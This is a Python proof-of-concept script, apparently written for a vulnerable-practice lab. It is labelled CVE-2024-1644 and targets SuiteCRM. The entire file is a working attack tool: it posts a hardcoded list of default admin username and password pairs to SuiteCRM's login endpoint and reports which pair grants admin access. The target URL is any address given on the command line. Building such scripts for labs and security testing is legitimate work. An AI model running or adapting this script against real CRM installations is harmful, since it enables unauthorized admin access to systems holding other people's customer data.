#!/usr/bin/env python3
"""SuiteCRM Default Credentials PoC (CVE-2024-1644)

Tests default admin credentials on SuiteCRM.
Educational proof-of-concept for KZ-Sploitable lab.
"""

import sys
import urllib.request
import urllib.parse


CRED_PAIRS = [
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", "Admin123"),
    ("administrator", "administrator"),
]


def main():
    target = sys.argv[1] if len(sys.argv) > 1 else "http://kz-suitecrm:80"
    print(f"[*] Target: {target}")
    print(f"[*] CVE: CVE-2024-1644")
    print(f"[*] Type: Default / Weak Credentials")
    print()

    login_url = f"{target}/index.php?action=Authenticate&module=Users"

    for username, password in CRED_PAIRS:
        print(f"[+] Trying {username}:{password} ...")

        data = urllib.parse.urlencode({
            "user_name": username,
            "user_password": password,
            "module": "Users",
            "action": "Authenticate",
        }).encode()

        try:
            req = urllib.request.Request(login_url, data=data, method="POST")
            req.add_header("User-Agent", "KZ-Sploitable-PoC/1.0")
            req.add_header("Content-Type", "application/x-www-form-urlencoded")

            with urllib.request.urlopen(req, timeout=10) as resp:
                body = resp.read().decode("utf-8", errors="replace")
                if "logout" in body.lower() or "dashboard" in body.lower():
                    print(f"[+] SUCCESS: Logged in with {username}:{password}")
                    print(f"[+] Access granted to CRM admin panel")
                    return
                else:
                    print(f"[-] Failed: {username}:{password}")

        except urllib.error.HTTPError as e:
            if e.code == 302:
                location = e.headers.get("Location", "")
                if "module=Home" in location or "action=index" in location:
                    print(f"[+] SUCCESS: Logged in with {username}:{password}")
                    return
            print(f"[-] HTTP {e.code} for {username}:{password}")
        except Exception as e:
            print(f"[!] Error: {e}")

    print()
    print("[*] No default credentials worked -- service may be patched")
    print("[*] PoC execution complete")


if __name__ == "__main__":
    main()
